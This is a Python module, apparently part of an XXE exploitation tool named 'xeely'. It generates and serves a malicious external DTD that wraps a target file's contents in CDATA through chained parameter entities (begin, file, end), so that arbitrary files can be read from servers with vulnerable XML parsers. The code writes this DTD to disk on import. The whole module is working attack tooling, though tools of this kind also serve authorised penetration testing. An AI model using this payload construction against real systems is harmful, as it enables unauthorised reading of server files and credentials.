import os
from typing import List

from xeely import RESOURCES_PATH
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml import XMLEntity

CDATA_FILE_PATH = RESOURCES_PATH / "cdata.dtd"


CDATA_JOINED_ENTITY_NAME = "all"
CDATA_EXPLOIT_ENTITY_NAME = "joined"


def get_cdata_dtd_file_url(http_server_params: HTTPServerParams) -> str:
    return f"{http_server_params.get_base_url()}/{CDATA_FILE_PATH.name}"


def get_cdata_entities(file_entity_value) -> List[XMLEntity]:
    return [
        XMLEntity(_name="begin", _value="<![CDATA[", _is_parameter=True),
        XMLEntity(_name="file", _value=file_entity_value, _is_external=True, _is_parameter=True),
        XMLEntity(_name="end", _value="]]>", _is_parameter=True),
    ]


def create_cdata_dtd_file():
    entities = [
        XMLEntity(
            _name=CDATA_EXPLOIT_ENTITY_NAME,
            _value="%begin;%file;%end;",
        )
    ]

    with open(CDATA_FILE_PATH, "w") as file:
        for entity in entities:
            file.write(f"{entity.to_xml()}\n")


def delete_cdata_dtd_file():
    os.remove(CDATA_FILE_PATH)


create_cdata_dtd_file()
